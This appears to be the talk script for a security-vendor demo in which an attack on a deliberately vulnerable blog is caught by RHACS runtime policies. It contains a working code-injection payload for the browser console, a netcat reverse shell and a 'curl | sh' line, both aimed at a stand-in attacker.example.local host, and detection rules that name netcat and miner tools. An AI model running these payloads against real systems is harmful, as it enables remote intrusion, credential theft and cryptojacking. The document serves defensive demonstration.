💡 Worth noticing: the attacker's own sh and curl are in the baseline (the feature uses them). RHACS still catches every other binary. That's why baselines beat signatures.

docs.title: Act 3 — "Living off the land: loot" (4 min)
docs.text:
scripts/demo.sh act3

The attacker hunts for credentials and hits the hardening:

  • No service account token → nothing to steal for the Kubernetes API.
  • Nothing in the environment.
  • But: ~/.aws/credentials and /opt/blog/.env! The attacker reads AWS keys and app secrets.

💬 "Those keys are fake. We planted them. The app never touches that file — so the only thing that ever will is an attacker. It's a honeytoken, and RHACS just told us someone took the bait."

Show TDR – Honeytoken touched in Violations.

Then lateral movement: the blog probes the Kubernetes API and reads card data from payments-api. Switch to the Network Graph: the blog → payments-api flow is drawn as anomalous, and TDR – Unexpected network flow to payments-api fires: payments-api's network baseline is empty and locked — nothing legitimate ever calls it.

docs.title: Act 4 — "Persistence and profit" (4 min)
docs.text:
Start the listener in Terminal B first:

scripts/attacker.sh c2

Then in Terminal A:

scripts/demo.sh act4
  1. Reverse shell. The blog connects back to attacker.example.local:4444 — the presenter's laptop. In Terminal B, type live: id, hostname, ps. The audience sees an interactive shell inside your "unhackable" pod.
  2. Crypto miner. The attacker downloads http://attacker.example.local:8080/stage.sh and pipes it into sh. Root FS is read-only, /dev/shm is noexec — but /tmp is a writable emptyDir. A binary named xmrig lands in /tmp/.cache, gets chmod +x, starts and connects to attacker.example.local:3333. (It's a harmless simulator: it burns one core and mines nothing.) scripts/attacker.sh logs shows the attacker's side: the download and the incoming miner shares.

Show the stack of violations: Reverse shell tool executed, Crypto miner, Container drift: file dropped or made executable (File Activity Monitoring saw the CREATE in /tmp and the chmod), plus new network flows from the blog to the external entity attacker.example.local on 8080, 4444 and 3333.

💬 "Everything the attacker did was seen within seconds, and every alert is mapped to MITRE ATT&CK. But seeing isn't stopping. The miner is still running and the shell is still open."

docs.title: Act 5 — "Respond: shrink the blast radius, then close the door" (4 min)
docs.text:
scripts/demo.sh act5

Two steps, in the order real incident response works — stop the bleeding, then close the door:

  1. Kill (immediate containment). The script switches the TDR policies to Kill Pod (they're SecurityPolicy custom resources — policy as code). The attacker comes back with id… the pod is killed (OpenShift records a StackRox enforcement event) and Kubernetes replaces it from the original image. Terminal B — the reverse shell — goes dead; the miner and /tmp/.cache are gone. Every new attempt costs the attacker the pod: the blast radius is now one command, and we've bought time.
  2. Network enforcement (with time bought). A NetworkPolicy: the blog may receive traffic from the router and reach DNS and the internet on 80/443; payments-api accepts nothing. The retry uses an in-process Go rule — the app itself makes the outbound call, no new process for RHACS to kill — and it times out: attacker.example.local:8080 is unreachable. The NetworkPolicy stops what enforcement can't see.

💬 "The kill stopped this attacker. The NetworkPolicy stops the next one before the first packet leaves."

Point out the violation's Enforcement tab: "Kill Pod has been applied N times".

⚠️ With enforcement on, anything outside the baseline kills the pod — including head, grep or an oc exec by you. That is the point. scripts/demo.sh reset turns it off again.

docs.title: Act 6 — "Fix forward" (3 min)
docs.text:
scripts/demo.sh act6

Show the diff between app/blog/linkcheck_v1.go and linkcheck_v2.go: parse the URL, allow only http/https, use Go's HTTP client — no rule engine, nothing evaluated. v2 rolls out, still 0 CVEs, and the exploit returns rejected.

💬 "Close with the three layers: shift-left kept the image clean — zero CVEs. Runtime detection caught the attack the scanner could never see. Enforcement and network policy stopped it. You need all three."

docs.title: Reset between runs
docs.text:
scripts/demo.sh reset     # enforcement off, NetworkPolicies removed, back to v1, fresh pods, violations resolved

Baselines stay locked across resets (they're per deployment, not per pod). Full rebuild: scripts/02-demo-setup.sh. Everything from scratch: scripts/01-rhacs-install.sh --uninstall && crc delete.

Ad-hoc commands through the vulnerability: scripts/demo.sh pwn 'ls -la /tmp'.

docs.title: The attacker lives outside the cluster
docs.text:
Nothing attacker-side runs in OpenShift. The attacker's machine is the presenter's laptop, reached by name — exactly like a real attacker-controlled domain on the internet:

 blog pod ──► attacker.example.local:8080   payload server  (stage.sh, xmrig)
          ──► attacker.example.local:3333   mining pool
          ──► attacker.example.local:4444   C2 — reverse shell listener (scripts/attacker.sh c2)
Piece How The address 1.2.3.4 — a real, routable public IPv4. RHACS treats private ranges (192.168.x, 10.x) as internal, so the attacker needs a public address. attacker.sh up adds it to the laptop's crc bridge (runtime only) — "spoofed" locally: the CRC VM's default gateway is the laptop, so pod traffic to it lands there and never leaves the machine. Override with ATTACKER_IP=…. The name attacker.sh up runs the attacker's own nameserver (podman, :5300/udp) answering *.example.local with 1.2.3.4, and adds one forwarding rule to OpenShift DNS: zone example.local → that nameserver. The services podman containers on the laptop, bound only to 1.2.3.4. The firewall The laptop keeps dropping all inbound traffic. Only the CRC bridge (zone libvirt) gets runtime rules for 5300/udp, 8080/3333/4444/tcp from 192.168.130.0/24. attacker.sh down (or a reboot) removes them. In RHACS 1.2.3.4/32 is registered as a named external network entity, so the Network Graph shows attacker.example.local outside the cluster, not an IP. Ordinary internet traffic stays one External Entities node.

docs.title: roxctl and the rox-* helpers
docs.text:
01-rhacs-install.sh stores an API token and the Central endpoint in ~/.config/rhacs/crc.env (mode 600) and installs ~/.bashrc.d/rhacs.sh, so every new shell has ROX_ENDPOINT and ROX_API_TOKEN and plain roxctl just works (roxctl central whoami).

The same file loads readable helpers. They do not replace roxctl — they call it with -o json and print tables that fit the screen:

Helper Shows rox-ui / rox-password Central URL, user, password (password also copied to the clipboard) rox-scan IMAGE [SEV] CVE summary + table rox-check IMAGE / rox-deploy FILE build-time / deploy-time policy violations rox-violations [NS] active violations, newest first, with enforcement count rox-processes NS/DEPLOY every process RHACS saw in a deployment rox-baseline NS/DEPLOY the locked process baseline

docs.title: The policies
docs.text:
Policy Detects Act 5 TDR – Unauthorized process in the Unhackable Blog any process outside the locked baseline kill pod TDR – Reverse shell tool executed nc, ncat, netcat, socat kill pod TDR – Crypto miner in the Unhackable Blog xmrig, minerd, cpuminer, … kill pod TDR – Container drift: file dropped or made executable File Activity Monitoring: CREATE/RENAME under /tmp/**, PERMISSION_CHANGE under /tmp/** and /var/cache/blog/** (the only writable volumes) kill pod TDR – Honeytoken touched: decoy AWS credentials any process whose arguments name .aws/credentials or a .env file alert TDR – Kubernetes API reconnaissance from the blog any process whose arguments name the in-cluster API, kubernetes.default alert TDR – Unexpected network flow to payments-api network baseline anomaly, scoped to payments (empty, locked baseline) alert

All TDR policies are scoped to cluster production (namespace unhackable, or payments for lateral movement) and mapped to MITRE ATT&CK. RHACS's built-ins Netcat Execution Detected, Cryptocurrency Mining Process Execution and Unauthorized Process Execution fire too. The built-in Unauthorized Network Flow stays disabled: on a single-node cluster every DNS lookup appears as a new UDP flow.

RHACS 5.0 lessons baked into these policies (found while testing):

  • File Activity Monitoring watches exactly the paths your policies name. A /** makes it inventory the whole node — and nothing gets reported. Name the writable volumes only.
  • FAM reports modifications (create, rename, permission/ownership change, write-intent open). Reading a read-only file isn't one — that's why the honeytoken uses process arguments.
  • A runtime policy can't mix process and file criteria in different sections.
  • A network baseline anomaly fires the first time a flow between two deployments appears; resolving the alert doesn't re-arm it. reset recreates payments-api so every run is fresh.

docs.title: Questions you will get
docs.text:
"Why not just remove the shell from the image?" You should — v2 doesn't need it. But the point stands: the image passed every check with the shell in it, and plenty of real apps legitimately shell out. Distroless shrinks the toolbox; it doesn't fix your code. And attackers bring their own tools (Act 4 downloads one).

"Couldn't a WAF catch the malicious rule?" Maybe this payload. Not the next encoding. Runtime detection doesn't care how the attacker got in — it sees what they do.

"Won't kill-pod enforcement take my app down?" It kills one pod; the Deployment replaces it in seconds. It only fires on behaviour outside a locked baseline, so it's for workloads whose behaviour you know. Start in alert mode (Acts 2–4), enforce once the baseline is stable (Act 5).

"Doesn't the attacker get a connection before the kill?" Yes — briefly. Kill Pod is a response, not prevention: RHACS sees the exec, then kills the pod. Measured on this demo with enforcement on and no NetworkPolicy: the attacker sends nc attacker.example.local 4444 -e /bin/sh at t=0; the TCP connection reaches the attacker; at t=0.69 s RHACS kills the pod and the connection drops; at t=2.9 s a clean pod is Ready. Useless to a human typing commands — and the NetworkPolicy (Act 5, step 2) removes even that window.

"What can trigger the kill — process, file or network?" Tested on RHACS 5.0:

Trigger Kill Pod Process (binary outside the baseline, nc, xmrig, …) ✓ pod killed File activity (file created in /tmp by an allowed binary) ✓ pod killed — the event names the file policy Network-flow anomaly (blog → payments-api) ✗ alert only. Central accepts Kill Pod on the policy without error, but no pod is killed

So kills come from what runs and what gets written; network anomalies are answered with a NetworkPolicy — exactly Act 5's two steps. Don't assume a network-flow policy enforces just because the UI saved it.

"How long does baselining take?" RHACS learns automatically during an observation period. This demo locks the baseline right after generating normal traffic, through the API (scripts/lib/rhacs-baselines.sh).

"Is the miner real?" No. app/attacker-kit/xmrig is a simulator named xmrig so the policy matches it. It burns one core for at most 10 minutes and talks only to the fake pool on the presenter's laptop.

docs.title: Cheat sheet
docs.text: One page to memorize. Read it the night before. Keep it next to the laptop. The full text is in SCRIPT.md.

docs.title: Fire the attack from the browser (no terminal)
docs.text:
Open https://blog-unhackable.apps-crc.testing/write → F12 → Console → paste. The /write box only forwards real links, so the attacker goes around it and POSTs to the API. Same code path, same detections. (In TALK.html each box has a Copy button.)

Step 1 — show it runs any command (who am I, what is in my env):

const cmd = "id; env";
const rule = `(func() string { c, _ := base64.StdEncoding.DecodeString("${btoa(cmd)}"); out, _ := exec.Command("sh", "-c", string(c)).Output(); return string(out) })()`;
fetch('/api/links/check', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls:[rule]})})
  .then(r => r.json()).then(d => console.log(d.results[0].detail || d.results[0]));

Step 2 — later, the reverse shell (C2 listener up first), or swap cmd for the miner curl -s http://attacker.example.local:8080/stage.sh | sh:

const cmd = "nohup nc attacker.example.local 4444 -e /bin/sh >/dev/null 2>&1 & echo '[+] reverse shell launched'";
const rule = `(func() string { c, _ := base64.StdEncoding.DecodeString("${btoa(cmd)}"); out, _ := exec.Command("sh", "-c", string(c)).Output(); return string(out) })()`;
fetch('/api/links/check', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls:[rule]})})
  .then(r => r.json()).then(d => console.log(d.results[0].detail || d.results[0]));

docs.title: The spine — if you forget everything, say this
docs.text: Every check happens during build and during deployment — before the application runs. Secure today. Maybe not tomorrow. RHACS rescans every 4 hours. But no scan can see what nobody knows yet, what nobody noticed, or what somebody hid. A scan sees what is known. Runtime sees what happens. RHACS does both.
